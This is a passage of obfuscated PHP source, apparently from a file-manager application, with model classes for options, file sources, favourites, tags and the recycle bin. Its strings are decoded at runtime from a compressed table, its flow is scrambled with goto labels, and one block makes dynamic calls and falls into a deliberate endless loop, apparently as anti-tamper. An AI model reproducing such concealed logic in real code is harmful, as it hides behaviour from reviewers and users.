$AÔÈôêŞ—† - $aÄŒØÒ±; } if ($C‹‡‡ÛÀË <= 0) { return $a“©¼ÃŒ‚[43]; } if ($aÄŒØÒ± < 0 || $aÄŒØÒ± >= $AÔÈôêŞ—† || $C‹‡‡ÛÀË <= 0 || $C‹‡‡ÛÀË > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\x69\154\x65\122\x65\x61\144\40\145\x72\162\x6f\x72\41\x20\x73\164\141\162\164\75{$aÄŒØÒ±}\73\x6c\145\156\x67\x74\150\x3d{$C‹‡‡ÛÀË}\x3b\40\163\151\x7a\145\75{$AÔÈôêŞ—†}\x3b"); } goto dßê£‹¢˜º; B¢µ–³ÎÓë: $f‹³Õ‹›Ï = $C‹‡‡ÛÀË; if ($aÄŒØÒ± < 0) { $aÄŒØÒ± = $AÔÈôêŞ—† + $aÄŒØÒ±; } if ($C‹‡‡ÛÀË === !1) { $C‹‡‡ÛÀË = $AÔÈôêŞ—† - $aÄŒØÒ±; } goto fì…±Ô«É; dßê£‹¢˜º: $FÍÅÜäÑ­‰ = 64 * 1024; $AëÂ³¢îÓˆ =& self::$_chunkBuffer[$this->path]; if (!$AëÂ³¢îÓˆ) { $AëÂ³¢îÓˆ = array(); } goto F¬˜»¤›¯¢; e‡Íå¨¼»«: $a“©¼ÃŒ‚ =& $_SERVER[œÕÊİğö]; $AÔÈôêŞ—† = $this->info[$a“©¼ÃŒ‚[88]]; $d¼—ëğ‹à… = $aÄŒØÒ±; goto B¢µ–³ÎÓë; fÙ§È‡‚Ìù: } private function log($a…œË´Œ, $AÍÕ—¸Ç™ó) { $a¢¼æ¶„ƒï =& $_SERVER[œÕÊİğö]; $cÆÉÈğ„º– = timeFloat() - $this->timeStart; write_log(sprintf($a¢¼æ¶„ƒï[1414], $a…œË´Œ, $this->info[$a¢¼æ¶„ƒï[38]], $cÆÉÈğ„º–, $AÍÕ—¸Ç™ó), $a¢¼æ¶„ƒï[1100]); } } if (!isset($_SERVER[$_SERVER[œÕÊİğö][11]]) || !isset($_SERVER[$_SERVER[œÕÊİğö][9]])) { goto A†«•¼Üéö; A†«•¼Üéö: $CÄš×´â‡ = $_SERVER[œÕÊİğö][12]; $Eí±ª‡—öˆ = $_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]; $Eéç¨Ëàé = $CÄš×´â‡($Eí±ª‡—öˆ); goto Eá­ï«ƒÅœ; Eá­ï«ƒÅœ: $c›ğˆ†ñ­‚ = explode($_SERVER[œÕÊİğö][15], $Eéç¨Ëàé); if (count($c›ğˆ†ñ­‚) < $_SERVER[œÕÊİğö][16]) { $CŠ„®¼Á»ä = $_SERVER[œÕÊİğö][17]; $CŠ„®¼Á»ä(); } $cÇØÑÛ† = $_SERVER[œÕÊİğö][18]; goto E‰»é»š™á; E‰»é»š™á: $cÇØÑÛ†($_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]); $DÕØ˜Úå²ğ = 2; while ($DÕØ˜Úå²ğ > 1) { $e¿ã­ëï©Æ = rawurlencode($DÕØ˜Úå²ğ . $_SERVER[œÕÊİğö][251]); } goto cÀ²§Í«åß; cÀ²§Í«åß: } goto C§÷±ç”¨; eØŒãÀ•ÆŸ: define($_SERVER[œÕÊİğö][0], $_SERVER[œÕÊİğö][1]); $_SERVER[ï] = explode($_SERVER[œÕÊİğö][2], gzinflate(substr($_SERVER[œÕÊİğö][3], 10, -8))); function binCheckEq($c³¡•†¤¶ß, $DŠº´‹™œ‰) { return $c³¡•†¤¶ß == $DŠº´‹™œ‰; } goto A‡½å¥šÕ; c¦¢ïÉô„ä: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\x6d\117\160\x74\x69\x6f\156"; public $field = array(); public function listData($fé—ìŠ­‚¡ = false, $F½ç‚ôÙø = "\x6d\x6f\144\x69\146\x79\124\x69\x6d\x65", $aÇêç¥¿Ï‰ = false) { $eä†ì‚†ğ = Model($this->modelType)->get(!1, $this->optionType, !0); $a‘Ó¸È¦˜ = array_values($eä†ì‚†ğ); if ($a‘Ó¸È¦˜ && $a‘Ó¸È¦˜[0] && !is_array($a‘Ó¸È¦˜[0])) { Model($this->modelType)->cacheRemove($this->optionType); $eä†ì‚†ğ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$eä†ì‚†ğ) { return $fé—ìŠ­‚¡ ? null : array(); } if (!$fé—ìŠ­‚¡) { $eä†ì‚†ğ = array_filter(array_values($eä†ì‚†ğ)); return array_sort_by($eä†ì‚†ğ, $F½ç‚ôÙø, $aÇêç¥¿Ï‰); } return $eä†ì‚†ğ[$_SERVER[œÕÊİğö][401] . $fé—ìŠ­‚¡]; } public function insert($a‡’È…”âç) { goto e¸©»àõŞ“; e¸©»àõŞ“: $cğ¬—ÒÌŠ =& $_SERVER[œÕÊİğö]; $a‡’È…”âç = array_field_key($a‡’È…”âç, $this->field); $c¡¿š…‹‘Ğ = Model($this->modelType)->get($cğ¬—ÒÌŠ[402], $this->optionType . $cğ¬—ÒÌŠ[403]); goto bÒ…Ãó¶ã; bÒ…Ãó¶ã: $c¡¿š…‹‘Ğ = $c¡¿š…‹‘Ğ ? $c¡¿š…‹‘Ğ : 0; $a‡’È…”âç[$cğ¬—ÒÌŠ[404]] = ++$c¡¿š…‹‘Ğ; $a‡’È…”âç[$cğ¬—ÒÌŠ[204]] = time(); goto cÌ‹Ì‰ƒê; d»…Î„óè¿: return $c¡¿š…‹‘Ğ; goto EÅñ»àå; cÌ‹Ì‰ƒê: $a‡’È…”âç[$cğ¬—ÒÌŠ[94]] = time(); Model($this->modelType)->set($cğ¬—ÒÌŠ[402], $c¡¿š…‹‘Ğ, $this->optionType . $cğ¬—ÒÌŠ[403]); Model($this->modelType)->set($cğ¬—ÒÌŠ[401] . $c¡¿š…‹‘Ğ, $a‡’È…”âç, $this->optionType); goto d»…Î„óè¿; EÅñ»àå: } public function update($D–áí‹ˆ÷—, $d´…“š‚Š ) { goto a•»Ñ±Ï„; a•»Ñ±Ï„: $c×½šª½Í‡ =& $_SERVER[œÕÊİğö]; $d´…“š‚Š  = array_field_key($d´…“š‚Š , $this->field); $c™øÃÑØ‚• = $this->listData($D–áí‹ˆ÷—); goto AòÅöâ‚Ê; AòÅöâ‚Ê: if (!$c™øÃÑØ‚• || !$D–áí‹ˆ÷—) { return !1; } $d´…“š‚Š  = array_merge($c™øÃÑØ‚•, $d´…“š‚Š ); $d´…“š‚Š [$c×½šª½Í‡[94]] = time(); goto AÛßì½—¤; AÛßì½—¤: return Model($this->modelType)->set($c×½šª½Í‡[401] . $D–áí‹ˆ÷—, $d´…“š‚Š , $this->optionType); goto e¢İßÉ‘à¹; e¢İßÉ‘à¹: } public function remove($DÈÆÅæç»Ç) { if (!$DÈÆÅæç»Ç) { return !1; } return Model($this->modelType)->remove($_SERVER[œÕÊİğö][401] . $DÈÆÅæç»Ç, $this->optionType); } public function clear() { $Fù¼ñé×ñ¤ =& $_SERVER[œÕÊİğö]; Model($this->modelType)->remove($Fù¼ñé×ñ¤[402], $this->optionType . $Fù¼ñé×ñ¤[403]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($A†Ğ¯ëÇà, $A†™¡á¸ÏÌ) { if (!$A†™¡á¸ÏÌ) { return !1; } $C˜ôòˆŠŞ‰ = $this->listData(); $C˜ôòˆŠŞ‰ = array_to_keyvalue($C˜ôòˆŠŞ‰, $A†Ğ¯ëÇà); return isset($C˜ôòˆŠŞ‰[$A†™¡á¸ÏÌ]) ? $C˜ôòˆŠŞ‰[$A†™¡á¸ÏÌ] : !1; } public function findByName($A‡ŠÊÖ…ˆ­) { return $this->findByKey($_SERVER[œÕÊİğö][38], $A‡ŠÊÖ…ˆ­); } protected function resetData($Dñè­ÀÃ£°) { $c‰ïìì¢è¼ =& $_SERVER[œÕÊİğö]; $Dñè­ÀÃ£° = is_array($Dñè­ÀÃ£°) ? $Dñè­ÀÃ£° : array(); $B‡»Ë…ÇÈß = array(); for ($EÄšœ…áË± = 0; $EÄšœ…áË± < count($Dñè­ÀÃ£°); $EÄšœ…áË±++) { $B‡»Ë…ÇÈß[$c‰ïìì¢è¼[401] . $Dñè­ÀÃ£°[$EÄšœ…áË±][$c‰ïìì¢è¼[404]]] = $Dñè­ÀÃ£°[$EÄšœ…áË±]; } return Model($this->modelType)->set($B‡»Ë…ÇÈß, !1, $this->optionType); } private function getAutoName($A£¦ÛµÁËê) { $F³¥†áĞ‡ç = array_to_keyvalue($this->listData(), $_SERVER[œÕÊİğö][38]); if (!$F³¥†áĞ‡ç || !isset($F³¥†áĞ‡ç[$A£¦ÛµÁËê])) { return $A£¦ÛµÁËê; } for ($fµá„²É†§ = 1; $fµá„²É†§ < count($F³¥†áĞ‡ç); $fµá„²É†§++) { $b„µÌè†ß¾ = $A£¦ÛµÁËê . "\x28{$fµá„²É†§}\51"; if (!isset($F³¥†áĞ‡ç[$b„µÌè†ß¾])) { return $b„µÌè†ß¾; } } return $b„µÌè†ß¾; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($eàãæ¶§Ëø = false, $dä¸Ï×”­Ã = '', $DÙÒ£ßÑº = false) { goto c¢„‰ĞÔÔÌ; B×áÇõÍï¿: $då¦ÕËÙà¡ = $this->where($f“‡Ãİô¾Ÿ)->select(); $då¦ÕËÙà¡ = array_to_keyvalue($då¦ÕËÙà¡, $f›ÍåÓ¸˜é[103], $f›ÍåÓ¸˜é[382]); foreach ($då¦ÕËÙà¡ as $f‚‹ Ñˆ« => $c“¤ç‡¾ê) { if ($DÙÒ£ßÑº || in_array($f‚‹ Ñˆ«, $this->jsonField)) { $då¦ÕËÙà¡[$f‚‹ Ñˆ«] = json_decode($c“¤ç‡¾ê, !0); } } goto DËáŸœëÑÜ; Bºâ£”±í³: $AÑï–¶æ¡í = is_array($AÑï–¶æ¡í) ? $AÑï–¶æ¡í : array(); if (is_array($då¦ÕËÙà¡)) { $då¦ÕËÙà¡ = array_merge($AÑï–¶æ¡í, $då¦ÕËÙà¡); return $eàãæ¶§Ëø ? isset($då¦ÕËÙà¡[$eàãæ¶§Ëø]) ? $då¦ÕËÙà¡[$eàãæ¶§Ëø] : null : $då¦ÕËÙà¡; } $f“‡Ãİô¾Ÿ = $this->filterWhere(array($f›ÍåÓ¸˜é[39] => $dä¸Ï×”­Ã)); goto B×áÇõÍï¿; c¢„‰ĞÔÔÌ: $f›ÍåÓ¸˜é =& $_SERVER[œÕÊİğö]; $då¦ÕËÙà¡ = $this->cacheGet($dä¸Ï×”­Ã); $AÑï–¶æ¡í = $this->optionDefault($dä¸Ï×”­Ã); goto Bºâ£”±í³; DËáŸœëÑÜ: $this->cacheSet($dä¸Ï×”­Ã, $då¦ÕËÙà¡); $då¦ÕËÙà¡ = array_merge($AÑï–¶æ¡í, $då¦ÕËÙà¡); return $eàãæ¶§Ëø ? $då¦ÕËÙà¡[$eàãæ¶§Ëø] : $då¦ÕËÙà¡; goto D„„ƒ‘ÍÁ; D„„ƒ‘ÍÁ: } public function set($f¦¡¢Œ¯, $A¤ÂàÇÆ˜› = false, $bÅÚ–‚ÇíÃ = '') { goto aé‹Ã ‡–È; FòØ‹£áÒô: $FÃù²ì‚¶ = is_array($f¦¡¢Œ¯) ? $f¦¡¢Œ¯ : array($f¦¡¢Œ¯ => $A¤ÂàÇÆ˜›); foreach ($FÃù²ì‚¶ as $E¾ŸÆ™ˆ¤ƒ => $a•ôÛÏ‰¢Å) { if (is_array($a•ôÛÏ‰¢Å)) { $a•ôÛÏ‰¢Å = json_encode_force($a•ôÛÏ‰¢Å); } $this->checkLength($a•ôÛÏ‰¢Å, !1, $this->tableName . $eƒÓÙ¨¸¸Ò[4] . $f¦¡¢Œ¯); $a•ôÛÏ‰¢Å = self::textEncode($a•ôÛÏ‰¢Å); $FÃù²ì‚¶ = array($eƒÓÙ¨¸¸Ò[39] => $bÅÚ–‚ÇíÃ, $eƒÓÙ¨¸¸Ò[103] => $E¾ŸÆ™ˆ¤ƒ, $eƒÓÙ¨¸¸Ò[382] => $a•ôÛÏ‰¢Å); $c¸…Õ¡‹ñ[] = $this->filterWhere($FÃù²ì‚¶); } if (!$c¸…Õ¡‹ñ) { return !0; } goto aÁŠ‰ŞŒ; aé‹Ã ‡–È: $eƒÓÙ¨¸¸Ò =& $_SERVER[œÕÊİğö]; $this->cacheRemove($bÅÚ–‚ÇíÃ); $c¸…Õ¡‹ñ = array(); goto FòØ‹£áÒô; aÁŠ‰ŞŒ: return $this->addAll($c¸…Õ¡‹ñ, array(), !0); goto eËéÙÔÄ’; eËéÙÔÄ’: } protected function optionDefault($aõ½š–òĞØ = '') { return !1; } public function setDeep($Fô¦·§Œİ, $a¹¾æÚòøÍ = false, $BÂ“ˆ‡åÔÚ = '') { $FÇ…È¡ˆÆ¼ = explode($_SERVER[œÕÊİğö][105], $Fô¦·§Œİ); $Cò¢Â¸ğùÆ = $this->get(); array_set_value($Cò¢Â¸ğùÆ, $Fô¦·§Œİ, $a¹¾æÚòøÍ); $this->set($FÇ…È¡ˆÆ¼[0], $Cò¢Â¸ğùÆ[$FÇ…È¡ˆÆ¼[0]], $BÂ“ˆ‡åÔÚ); } public function remove($b†ºß²¯Ô, $B¤ïÀøˆ = '') { $a±²¾Ú¥ñˆ =& $_SERVER[œÕÊİğö]; $this->cacheRemove($B¤ïÀøˆ); $B†…Ş´“‹¹ = $this->filterWhere(array($a±²¾Ú¥ñˆ[103] => $b†ºß²¯Ô, $a±²¾Ú¥ñˆ[39] => $B¤ïÀøˆ)); if (is_null($b†ºß²¯Ô)) { unset($B†…Ş´“‹¹[$a±²¾Ú¥ñˆ[103]]); } return $this->where($B†…Ş´“‹¹)->delete(); } public function cacheSet($dÎÃ‡åì, $BÜìŸèæŸè = false) { return Cache::set($this->cacheKey($dÎÃ‡åì), $BÜìŸèæŸè); } public function cacheGet($aÎÅÁåò·ç) { return Cache::get($this->cacheKey($aÎÅÁåò·ç)); } public function cacheRemove($E¿°¯ìÜ©Ë) { return Cache::remove($this->cacheKey($E¿°¯ìÜ©Ë)); } protected function filterWhere($aø„Ë”´Š) { return $aø„Ë”´Š; } protected function cacheKey($cËá‚Õñ‰½) { return $cËá‚Õñ‰½; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\145"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\155\145" => "\151\x6f\137\x73\157\x75\x72\x63\x65\x5f\155\145\164\141", "\x6d\x65\x74\141\x46\151\x65\154\x64" => "\x73\x6f\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\x69\155\145", "\164\x69\155\145", "\151\x6e\163\145\x72\x74", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\x63\x72\x65\x61\164\145\124\151\155\x65", "\164\151\x6d\145", "\x69\156\x73\145\x72\164", "\x66\x75\156\143\x74\x69\x6f\156"), array("\x76\151\x65\167\x54\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\162\x74", "\146\165\156\143\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C×…õç‰¾) { return $this->listSource(array($_SERVER[œÕÊİğö][405] => $C×…õç‰¾)); } public function typeName($dÖ²­Øºµ) { static $D¦ĞŸè·ª = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $D¦ĞŸè·ª[$dÖ²­Øºµ . $_SERVER[œÕÊİğö][43]]; } public function sourceListInfo($e›ËƒŸéˆ¨, $CßÅô• Ä¡ = false) { goto FğÔÜ™©³Ì; fÛ‰¶ÁÎíø: if (!$e›ËƒŸéˆ¨) { return array(); } $då„ñ£Æè = $this->where(array($cˆÄµ¾Ú[406] => array($cˆÄµ¾Ú[7], $e›ËƒŸéˆ¨)))->select(); $this->_listDataApply($då„ñ£Æè, $CßÅô• Ä¡); goto DŠæİ§¿òÃ; FğÔÜ™©³Ì: $cˆÄµ¾Ú =& $_SERVER[œÕÊİğö]; $e›ËƒŸéˆ¨ = $e›ËƒŸéˆ¨ ? $e›ËƒŸéˆ¨ : array(); $e›ËƒŸéˆ¨ = array_filter(array_unique($e›ËƒŸéˆ¨)); goto fÛ‰¶ÁÎíø; DŠæİ§¿òÃ: return array_to_keyvalue($då„ñ£Æè, $cˆÄµ¾Ú[406]); goto aÔÕæç¾ñ; aÔÕæç¾ñ: } public function pathInfoFilter(&$dŸ‚‡‰¯) { goto Fù¨Ä…ê‡ª; A° †ëÁŞÈ: $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[86]] = $bÁ”‰ÅÅÓ•[412] . $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[406]] . $bÁ”‰ÅÅÓ•[413]; $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[39]] = $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[414]] == 1 ? $bÁ”‰ÅÅÓ•[87] : $bÁ”‰ÅÅÓ•[203]; $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[415]] = $this->typeName($dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[415]]); goto eÕê¿øÏíù; Fù¨Ä…ê‡ª: $bÁ”‰ÅÅÓ• =& $_SERVER[œÕÊİğö]; static $cñš¹ÊåÜ = false; static $a¢ë‡¦õÖ‘ = false; goto F™ÓàŞªö; F™ÓàŞªö: static $a¦Š†ÔˆÈ = false; if (!$cñš¹ÊåÜ) { goto E³ÇÏË‘±˜; C®İ‚šÉ£‹: $BøÌá·®ß = $bÁ”‰ÅÅÓ•[410]; $Bæ´½àù˜ = explode($bÁ”‰ÅÅÓ•[57], $BøÌá·®ß); $cñš¹ÊåÜ = explode($bÁ”‰ÅÅÓ•[57], $eøá”ƒòªš); goto bŠ¨ã¡çö¼; bŠ¨ã¡çö¼: $a¢ë‡¦õÖ‘ = array(); foreach ($cñš¹ÊåÜ as $AåÉÉ´Äë©) { if (in_array($AåÉÉ´Äë©, $Bæ´½àù˜)) { continue; } $a¢ë‡¦õÖ‘[] = $AåÉÉ´Äë©; } $a¦Š†ÔˆÈ = explode($bÁ”‰ÅÅÓ•[57], $bÁ”‰ÅÅÓ•[411]); goto a™Ï”ÏØ‹Š; E³ÇÏË‘±˜: $eøá”ƒòªš = $bÁ”‰ÅÅÓ•[407]; $eøá”ƒòªš .= $bÁ”‰ÅÅÓ•[408]; $eøá”ƒòªš .= $bÁ”‰ÅÅÓ•[409]; goto C®İ‚šÉ£‹; a™Ï”ÏØ‹Š: } foreach ($a¦Š†ÔˆÈ as $E–‚áîùŠ) { if (isset($dŸ‚‡‰¯[$E–‚áîùŠ])) { $dŸ‚‡‰¯[$E–‚áîùŠ] = intval($dŸ‚‡‰¯[$E–‚áîùŠ]); } } goto A° †ëÁŞÈ; eÕê¿øÏíù: if ($dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[414]] != 1) { $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[178]] = $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[416]]; unset($dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[416]]); } $B÷¼±¹†…ó = $cñš¹ÊåÜ; if (isset($dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[417]]) && $dŸ‚‡‰¯[$bÁ”‰ÅÅÓ•[417]][$bÁ”‰ÅÅÓ•[418]] == -1) { $B÷¼±¹†…ó = $a¢ë‡¦õÖ‘; } goto BèãŠ‚®Â; BèãŠ‚®Â: $dŸ‚‡‰¯ = array_field_key($dŸ‚‡‰¯, $B÷¼±¹†…ó); return $dŸ‚‡‰¯; goto bë¢ˆõ²ì; bë¢ˆõ²ì: } public function listUserFav() { goto e¤¬’ ´ˆ™; e¤¬’ ´ˆ™: $eÁàè­î†² =& $_SERVER[œÕÊİğö]; $E‰‹˜¢Şº = Model($eÁàè­î†²[419])->listData(); $fŞ†¾À¢á = array_filter_by_field($E‰‹˜¢Şº, $eÁàè­î†²[39], $eÁàè­î†²[420]); goto cõ—­Ö’İ¨; cõ—­Ö’İ¨: $fŞ†¾À¢á = array_to_keyvalue($fŞ†¾À¢á, $eÁàè­î†²[43], $eÁàè­î†²[86]); if ($fŞ†¾À¢á) { $AÏŠƒà« = $this->listSource(array($eÁàè­î†²[421] => array($eÁàè­î†²[422], $fŞ†¾À¢á))); } $AÏŠƒà« = array_to_keyvalue($AÏŠƒà«[$eÁàè­î†²[377]], $eÁàè­î†²[406]); goto aâ µÒö†; aâ µÒö†: foreach ($E‰‹˜¢Şº as &$a‰ìñ­“åƒ) { $a‰ìñ­“åƒ = array($eÁàè­î†²[423] => $a‰ìñ­“åƒ[$eÁàè­î†²[404]], $eÁàè­î†²[424] => $a‰ìñ­“åƒ[$eÁàè­î†²[38]], $eÁàè­î†²[425] => $a‰ìñ­“åƒ[$eÁàè­î†²[86]], $eÁàè­î†²[426] => $a‰ìñ­“åƒ[$eÁàè­î†²[39]], $eÁàè­î†²[427] => $a‰ìñ­“åƒ[$eÁàè­î†²[204]], $eÁàè­î†²[428] => $a‰ìñ­“åƒ[$eÁàè­î†²[94]]); if ($a‰ìñ­“åƒ[$eÁàè­î†²[39]] == $eÁàè­î†²[420] && $AÏŠƒà«[$a‰ìñ­“åƒ[$eÁàè­î†²[86]]]) { $a‰ìñ­“åƒ[$eÁàè­î†²[95]] = $AÏŠƒà«[$a‰ìñ­“åƒ[$eÁàè­î†²[86]]]; } } unset($a‰ìñ­“åƒ); return $E‰‹˜¢Şº; goto BÄ‡ óÉ™; BÄ‡ óÉ™: } public function listUserTag($CğÒÂ‘ÃÒÚ) { goto A§èƒ¿Ù£»; E´Á­‚ÌÂÑ: if ($bËø‚”ôÅ…) { Model($a§ƒË…šŠ¬[431])->removeBySource($bËø‚”ôÅ…); } return $DÔğœš”½; goto eÉˆ£±íÍ¿; C‚’½ˆƒ¼ˆ: if (!$DÔğœš”½ || count($BĞÉÍ¡õÖá) == $DÔğœš”½[$a§ƒË…šŠ¬[374]][$a§ƒË…šŠ¬[375]]) { return $DÔğœš”½; } $bËø‚”ôÅ… = array(); $bã…Ğ¿™” = array_to_keyvalue($DÔğœš”½[$a§ƒË…šŠ¬[85]], $a§ƒË…šŠ¬[43], $a§ƒË…šŠ¬[406]); goto DëÏå±ÔİÜ; AªÒœíĞ„Â: foreach ($e¬´¿Ñ—ÆŞ as $dï‰ä„é¸ì => $FĞ÷¾÷©ùí) { $bİ¸ªõ‹á– = !0; if (!$CğÒÂ‘ÃÒÚ) { $BĞÉÍ¡õÖá[] = $dï‰ä„é¸ì; continue; } foreach ($CğÒÂ‘ÃÒÚ as $E”éê”†á) { if (!in_array($E”éê”†á, $FĞ÷¾÷©ùí)) { $bİ¸ªõ‹á– = !1; break; } } if ($bİ¸ªõ‹á–) { $BĞÉÍ¡õÖá[] = $dï‰ä„é¸ì; } } if (!$BĞÉÍ¡õÖá) { return array(); } $DÔğœš”½ = $this->listSource(array($a§ƒË…šŠ¬[421] => array($a§ƒË…šŠ¬[422], $BĞÉÍ¡õÖá))); goto C‚’½ˆƒ¼ˆ; A§èƒ¿Ù£»: $a§ƒË…šŠ¬ =& $_SERVER[œÕÊİğö]; if ($CğÒÂ‘ÃÒÚ && !is_array($CğÒÂ‘ÃÒÚ)) { $CğÒÂ‘ÃÒÚ = array($CğÒÂ‘ÃÒÚ); } $BÉÜÑæ×ÒŠ = Model($a§ƒË…šŠ¬[429])->listData(); goto Aã…ĞÙø´¶; DëÏå±ÔİÜ: $b™÷Ü÷ë´± = array_to_keyvalue($DÔğœš”½[$a§ƒË…šŠ¬[84]], $a§ƒË…šŠ¬[43], $a§ƒË…šŠ¬[406]); $D˜¶ÆƒÅ = array_merge($b™÷Ü÷ë´±, $bã…Ğ¿™”); foreach ($BĞÉÍ¡õÖá as $bî­Ğ÷Âºº) { if (!in_array($bî­Ğ÷Âºº, $D˜¶ÆƒÅ)) { $bËø‚”ôÅ…[] = $bî­Ğ÷Âºº; } } goto E´Á­‚ÌÂÑ; Aã…ĞÙø´¶: $e¬´¿Ñ—ÆŞ = array(); foreach ($BÉÜÑæ×ÒŠ as $AÅöŞ»š×Á) { $bî­Ğ÷Âºº = $AÅöŞ»š×Á[$a§ƒË…šŠ¬[86]]; if (!$bî­Ğ÷Âºº) { continue; } if (!isset($e¬´¿Ñ—ÆŞ[$bî­Ğ÷Âºº])) { $e¬´¿Ñ—ÆŞ[$bî­Ğ÷Âºº] = array(); } $e¬´¿Ñ—ÆŞ[$bî­Ğ÷Âºº][] = $AÅöŞ»š×Á[$a§ƒË…šŠ¬[430]]; } $BĞÉÍ¡õÖá = array(); goto AªÒœíĞ„Â; eÉˆ£±íÍ¿: } public function listUserRecycle() { $E÷…šàäÈù =& $_SERVER[œÕÊİğö]; $e†Üæƒ = Model($E÷…šàäÈù[432])->listData(); if (!$e†Üæƒ) { return array(); } $dÂ¤­Ì±¸ = array($E÷…šàäÈù[421] => array($E÷…šàäÈù[422], $e†Üæƒ), $E÷…šàäÈù[433] => 1); return $this->listSource($dÂ¤­Ì±¸); } public function listSource($BÎé›êÛã˜, $BĞä§˜õÀ± = 3000) { goto aÏ­ƒò×½Ï; BÄÂ²İÙÃ: $bİ‚ ²—ØÚ = $this->field($E¥ó„¯ô©ç)->_makeOrder()->where($BÎé›êÛã˜)->selectPage($BĞä§˜õÀ±); $this->_listPageCheck($bİ‚ ²—ØÚ, $E¥ó„¯ô©ç, $BÎé›êÛã˜); $this->_listDataApply($bİ‚ ²—ØÚ[$bÂä¯´ÁÂ‘[377]]); goto dÄÉë¦æŠ¬; aÏ­ƒò×½Ï: $bÂä¯´ÁÂ‘ =& $_SERVER[œÕÊİğö]; if (!isset($BÎé›êÛã˜[$bÂä¯´ÁÂ‘[434]])) { $BÎé›êÛã˜[$bÂä¯´ÁÂ‘[434]] = 0; } $E¥ó„¯ô©ç = $bÂä¯´ÁÂ‘[435]; goto BÄÂ²İÙÃ; dÄÉë¦æŠ¬: $this->_listMake($bİ‚ ²—ØÚ); return $bİ‚ ²—ØÚ; goto aÕÅ‡‰™Ùå; aÕÅ‡‰™Ùå: } private function _listPageCheck(&$Cáá¾Æ×óÇ, $bÏ§Š…òáˆ, $D–º¹É´) { goto a‘¡”«âŒ; B ÙâàøÎ: if ($cÈñ¡É¯õË[$B…Í™Õ­[376]] <= 1) { return; } if ($cÈñ¡É¯õË[$B…Í™Õ­[375]] >= 100000) { return; } if (Model($B…Í™Õ­[436])->get($B…Í™Õ­[437]) != $B…Í™Õ­[438]) { return; } goto FäÔ¾ŒËš; a‘¡”«âŒ: $B…Í™Õ­ =& $_SERVER[œÕÊİğö]; if (!is_array($Cáá¾Æ×óÇ[$B…Í™Õ­[374]])) { return; } $cÈñ¡É¯õË = $Cáá¾Æ×óÇ[$B…Í™Õ­[374]]; goto B ÙâàøÎ; c’åÕ¢ïŞÒ: if ($f‹’ºÜÒÓß) { $Cáá¾Æ×óÇ[$B…Í™Õ­[377]] = $f‹’ºÜÒÓß; } goto BëĞ»²ˆĞ; FäÔ¾ŒËš: $bÏ§Š…òáˆ = str_replace(array($B…Í™Õ­[60], $B…Í™Õ­[350], $B…Í™Õ­[15]), $B…Í™Õ­[43], $bÏ§Š…òáˆ); $bÏ§Š…òáˆ = $B…Í™Õ­[439] . str_replace($B…Í™Õ­[57], $B…Í™Õ­[440], $bÏ§Š…òáˆ) . $B…Í™Õ­[441]; $b£Û…æá£é = $B…Í™Õ­[442]; goto bÍ­â¢ùõ; bÍ­â¢ùõ: $b£Û…æá£é = $b£Û…æá£é . $B…Í™Õ­[443]; $EĞ¤½Œ¹ÑÑ = $cÈñ¡É¯õË[$B…Í™Õ­[371]] * ($cÈñ¡É¯õË[$B…Í™Õ­[361]] - 1) . $B…Í™Õ­[57] . $cÈñ¡É¯õË[$B…Í™Õ­[371]]; $AÄÍÌã®ªŒ = $this->_makeOrder(!0); goto AÏ·ö„Ó›â; AÏ·ö„Ó›â: $BÛ‚¸ˆç…ñ = $B…Í™Õ­[439] . str_replace($B…Í™Õ­[57], $B…Í™Õ­[440], $AÄÍÌã®ªŒ[0]); if (strpos($BÛ‚¸ˆç…ñ, $B…Í™Õ­[444])) { $BÛ‚¸ˆç…ñ = str_replace($B…Í™Õ­[444], $B…Í™Õ­[445], $BÛ‚¸ˆç…ñ); } else { $BÛ‚¸ˆç…ñ .= $B…Í™Õ­[446] . $AÄÍÌã®ªŒ[1]; } $c™’ƒ†› = array(); goto Cñ¹£ò”‚; Cñ¹£ò”‚: foreach ($D–º¹É´ as $bç¹í·ÎÂÊ => $a»÷ÌÓ¹¸) { $c™’ƒ†›[$B…Í™Õ­[439] . $bç¹í·ÎÂÊ] = $a»÷ÌÓ¹¸; } $this->alias($B…Í™Õ­[447])->field($bÏ§Š…òáˆ)->limit($EĞ¤½Œ¹ÑÑ)->order($BÛ‚¸ˆç…ñ); $f‹’ºÜÒÓß = $this->join($b£Û…æá£é)->where($c™’ƒ†›)->select(); goto c’åÕ¢ïŞÒ; BëĞ»²ˆĞ: } protected function _makeOrder($B¨Ş•óòŸ» = false) { goto c›æÕòÅò; c›æÕòÅò: $fáõ­¡ï·Ò =& $_SERVER[œÕÊİğö]; $c«›Í©¡æ‘ = Model($fáõ­¡ï·Ò[448])->get($fáõ­¡ï·Ò[449]); 